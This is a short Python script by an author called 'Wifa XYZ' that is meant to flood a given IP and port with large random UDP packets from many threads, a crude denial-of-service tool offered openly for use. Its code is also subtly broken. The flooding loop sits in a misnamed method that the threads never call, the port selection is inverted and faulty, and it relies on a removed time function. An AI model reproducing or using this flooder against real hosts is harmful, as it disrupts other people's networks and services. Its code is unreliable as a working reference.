import random
import threading
import socket
import sys
import time
import os

port = int(sys.argv[2])
randport=(True,False)[port==0]
ip = sys.argv[1]
dur = int(sys.argv[3])
clock=(lambda:0,time.clock)[dur>0]
duration=(1,(clock()+dur))[dur>0]
print('@WifaXY Attack Ip: %s:%s XYZ %s Ikehh'%(ip,port,dur or 'infinite'))

class WifaXYZ(threading.Thread):

    def WifaXy(self):
        while True:
            sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            bytes=random._urandom(65500)
            while True:
                port=(random.randint(1,15000000),port)[randport]
                if clock()<duration:
                    sock.sendto(bytes,(ip,port))
                else:
                    break

if __name__ == '__main__':
    try:
        for x in range(100):
            wifaxy = WifaXYZ()
            wifaxy.start()
            time.sleep(100)
            
    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ('XXXXXXXXXXXXXXXXXXX')
        print ('X Yah Eror Jancuk X')
        print ('XXXXXXXXXXXXXXXXXXX')
        print ('X Author : Wifa XYZ')
